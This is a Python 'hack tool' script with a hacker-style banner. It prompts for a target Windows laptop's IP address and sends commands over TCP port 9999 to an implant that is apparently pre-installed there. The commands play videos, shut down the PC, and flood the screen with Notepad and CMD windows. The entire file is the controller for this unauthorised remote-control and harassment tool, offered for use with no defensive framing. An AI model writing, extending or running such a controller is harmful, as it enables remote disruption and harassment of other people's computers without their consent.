import socket
import os
import time

# ANSI color codes for Termux (hacker theme)
GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[94m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Cool hacker-style ASCII banner
def show_banner():
    os.system("clear")
    print(f"""{BOLD}{CYAN}

██╗   ██╗██╗ ██████╗ ███╗   ██╗███████╗███████╗██╗  ██╗
██║   ██║██║██╔════╝ ████╗  ██║██╔════╝██╔════╝██║  ██║
██║   ██║██║██║  ███╗██╔██╗ ██║█████╗  ███████╗███████║
╚██╗ ██╔╝██║██║   ██║██║╚██╗██║██╔══╝  ╚════██║██╔══██║
 ╚████╔╝ ██║╚██████╔╝██║ ╚████║███████╗███████║██║  ██║
  ╚═══╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                       
              {YELLOW}VIGNESH HACK TOOL {RESET}
    """)

def send_command(target_ip, command):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, 9999))
        client.sendall(command.encode())
        client.close()
        print(f"{GREEN}[+] Command sent: {command}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")

def main():
    show_banner()
    print(f"{BOLD}{BLUE}[*] Enter target Windows laptop IP:{RESET}", end=" ")
    target_ip = input().strip()

    while True:
        print("\n" + "-" * 50)
        print(f"{BOLD}{YELLOW}Available Commands:{RESET}")
        print(f"    {GREEN}[1]{RESET} Play a video (provide full path)")
        print(f"    {GREEN}[2]{RESET} Stop all hacks")
        print(f"    {GREEN}[3]{RESET} Shutdown target PC")
        print(f"    {GREEN}[4]{RESET} LOL (Notepad spam)")
        print(f"    {GREEN}[5]{RESET} CLI Hack (CMD spam with tree command)")
        print(f"    {GREEN}[6]{RESET} Exit")
        print("-" * 50)

        choice = input(f"{BOLD}{CYAN}Enter choice:{RESET} ").strip()

        if choice == "1":
            video_path = input(f"{BOLD}{CYAN}Enter video path:{RESET} ").strip()
            send_command(target_ip, f"play {video_path}")

        elif choice == "2":
            send_command(target_ip, "stopall")

        elif choice == "3":
            send_command(target_ip, "shutdown")
            print(f"{GREEN}[+] Shutdown command sent.{RESET}")

        elif choice == "4":
            send_command(target_ip, "lol")
            print(f"{GREEN}[+] LOL command sent!{RESET}")

        elif choice == "5":
            send_command(target_ip, "clihack")
            print(f"{GREEN}[+] CLI Hack activated!{RESET}")

        elif choice == "6":
            print(f"{GREEN}[+] Exiting...{RESET}")
            break

        else:
            print(f"{RED}[-] Invalid choice. Try again!{RESET}")
        time.sleep(1)  # Small delay for readability

if __name__ == "__main__":
    main()
